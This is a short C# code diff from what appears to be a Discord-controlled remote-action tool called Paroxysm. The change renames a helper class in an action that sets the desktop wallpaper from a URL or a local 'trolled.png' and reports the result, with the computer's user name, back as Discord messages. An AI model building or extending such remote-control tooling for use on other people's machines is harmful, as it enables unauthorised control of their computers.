@@ -1,6 +1,6 @@
 ﻿using System.Net;
 using Discord;
-using Paroxysm.Tools;
+using Paroxysm.Discord;
 
 namespace Paroxysm.Hooks.Actions;
 
@@ -44,19 +44,19 @@ public static class ChangeWallpaperAction
     {
         if (await SetWallpaperFromUrl(imageUrl!))
         {
-            return EmbedCreator.CreateWithText(Color.Green, "Command was successfully executed.",
+            return DiscordEmbed.CreateWithText(Color.Green, "Command was successfully executed.",
                 "Image has been set as desktop wallpaper.", Environment.UserName, null);
         }
 
         const string localImagePath = "trolled.png";
         if (!File.Exists(localImagePath))
         {
-            return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
+            return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
                 "Unable to set desktop wallpaper.", Environment.UserName, null);
         }
 
         SetWallpaper(localImagePath);
-        return EmbedCreator.CreateWithText(Color.Green, "Command was successfully executed.",
+        return DiscordEmbed.CreateWithText(Color.Green, "Command was successfully executed.",
             "Local image was been set as desktop wallpaper.", Environment.UserName, null);
     }
 }
